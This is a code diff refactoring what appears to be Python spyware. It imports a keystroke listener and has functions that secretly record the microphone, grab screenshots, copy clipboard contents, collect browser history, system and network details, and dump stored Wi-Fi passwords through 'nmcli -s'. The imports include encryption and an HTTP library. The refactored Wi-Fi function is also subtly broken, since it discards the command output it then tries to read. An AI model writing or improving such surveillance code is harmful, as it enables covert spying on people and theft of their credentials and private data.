@@ -3,16 +3,23 @@ import shutil
 import socket
 import sys
 import time
-from multiprocessing import Process
-from pathlib import Path
-from subprocess import Popen, TimeoutExpired, check_output, DEVNULL
-from threading import Thread
+import logging
+import json
 import requests
+from multiprocessing import Process
+from threading import Thread
+from pathlib import Path
+from subprocess import Popen, TimeoutExpired, DEVNULL, CalledProcessError
+from pynput.keyboard import Listener
 from cryptography.fernet import Fernet
 from PIL import ImageGrab
-from pynput.keyboard import Listener
 import browserhistory as bh
-import sounddevice
+import sounddevice as sd
+import soundfile as sf  # Import soundfile module for writing audio files
+
+# Function to print errors to stderr
+def print_err(message):
+    print(f"Error: {message}", file=sys.stderr)
 
 # Regular expression object for file matching
 class RegObject:
@@ -51,10 +58,10 @@ def microphone(mic_path: Path):
 
     for current in range(1, 6):
         channel = 2 if os.name == 'nt' else 1
-        rec_name = mic_path / f'{current}mic_recording.wav' if os.name == 'nt' else mic_path / f'{current}mic_recording.mp4'
-        my_recording = sounddevice.rec(int(seconds * frames_per_second), samplerate=frames_per_second, channels=channel)
-        sounddevice.wait()
-        sounddevice.write(str(rec_name), my_recording, frames_per_second)
+        rec_name = mic_path / f'{current}_mic_recording.wav'
+        my_recording = sd.rec(int(seconds * frames_per_second), samplerate=frames_per_second, channels=channel)
+        sd.wait()  # Wait until recording is finished
+        sf.write(rec_name, my_recording, frames_per_second, format='wav')
 
 # Screenshot capture function
 def screenshot(screenshot_path: Path):
@@ -88,20 +95,21 @@ def get_browser_history(browser_file: Path):
 def get_clipboard(export_path: Path):
     if os.name == 'nt':
         try:
+            import win32clipboard
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
-        except (OSError, TypeError):
-            pasted_data = ''
-        finally:
             win32clipboard.CloseClipboard()
         
-        clip_path = export_path / 'clipboard_info.txt'
-        try:
-            with clip_path.open('w', encoding='utf-8') as clipboard_info:
-                clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
-        except OSError as file_err:
-            print_err(f'Error occurred during file operation: {file_err}')
-            logging.exception('Error occurred during file operation: %s\n', file_err)
+            clip_path = export_path / 'clipboard_info.txt'
+            try:
+                with clip_path.open('w', encoding='utf-8') as clipboard_info:
+                    clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
+            except OSError as file_err:
+                print_err(f'Error occurred during file operation: {file_err}')
+                logging.exception('Error occurred during file operation: %s\n', file_err)
+        except (OSError, TypeError, ImportError) as ex:
+            print_err(f'Error occurred during clipboard operation: {ex}')
+            logging.exception('Error occurred during clipboard operation: %s\n', ex)
 
 # Get system information function
 def get_system_info(sysinfo_file: Path):
@@ -115,30 +123,33 @@ def get_system_info(sysinfo_file: Path):
             with Popen(syntax, stdout=system_info, stderr=system_info, shell=True, stdin=DEVNULL) as get_sysinfo:
                 get_sysinfo.communicate(timeout=30)
 
-    except OSError as file_err:
-        print_err(f'Error occurred during file operation: {file_err}')
-        logging.exception('Error occurred during file operation: %s\n', file_err)
-    except TimeoutExpired:
-        pass
+    except (OSError, TimeoutExpired) as ex:
+        print_err(f'Error occurred during system info retrieval: {ex}')
+        logging.exception('Error occurred during system info retrieval: %s\n', ex)
 
 # Linux Wi-Fi query function
 def linux_wifi_query(export_path: Path):
     if os.name != 'nt':
         wifi_path = export_path / 'wifi_info.txt'
         try:
-            get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
-            for wifi in get_wifis.split(b'\n'):
-                if b'Wired' not in wifi:
-                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
-                        with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list, stderr=wifi_list, shell=True) as command:
-                            command.communicate(timeout=60)
-        except CalledProcessError as proc_err:
-            logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)
-        except OSError as file_err:
-            print_err(f'Error occurred during file operation: {file_err}')
-            logging.exception('Error occurred during file operation: %s\n', file_err)
-        except TimeoutExpired:
-            pass
+            get_wifis = Popen(['nmcli', '-g', 'NAME', 'connection', 'show'], stdout=DEVNULL, stderr=DEVNULL)
+            output, _ = get_wifis.communicate(timeout=60)
+            if output:
+                for wifi in output.split(b'\n'):
+                    if b'Wired' not in wifi:
+                        with wifi_path.open('w', encoding='utf-8') as wifi_list:
+                            wifi_name = wifi.decode().strip()
+                            if wifi_name:
+                                try:
+                                    cmd = ['nmcli', '-s', 'connection', 'show', wifi_name]
+                                    proc = Popen(cmd, stdout=wifi_list, stderr=wifi_list, shell=False)
+                                    proc.communicate(timeout=60)
+                                except (OSError, TimeoutExpired) as ex:
+                                    print_err(f'Error occurred during Wi-Fi info retrieval for {wifi_name}: {ex}')
+                                    logging.exception('Error occurred during Wi-Fi info retrieval for %s: %s\n', wifi_name, ex)
+        except (OSError, TimeoutExpired) as ex:
+            print_err(f'Error occurred during Wi-Fi SSID list retrieval: {ex}')
+            logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', ex)
 
 # Get network information function
 def get_network_info(export_path: Path, network_file: Path):
@@ -157,11 +168,9 @@ def get_network_info(export_path: Path, network_file: Path):
                 public_ip = requests.get('https://api.ipify.org').text
                 network_io.write(f'[!] Public IP Address: {public_ip}\n[!] Private IP Address: {ip_addr}\n')
 
-    except OSError as file_err:
-        print_err(f'Error occurred during file operation: {file_err}')
-        logging.exception('Error occurred during file operation: %s\n', file_err)
-    except TimeoutExpired:
-        pass
+    except (OSError, TimeoutExpired) as ex:
+        print_err(f'Error occurred during network info retrieval: {ex}')
+        logging.exception('Error occurred during network info retrieval: %s\n', ex)
 
 # Main function
 def main():
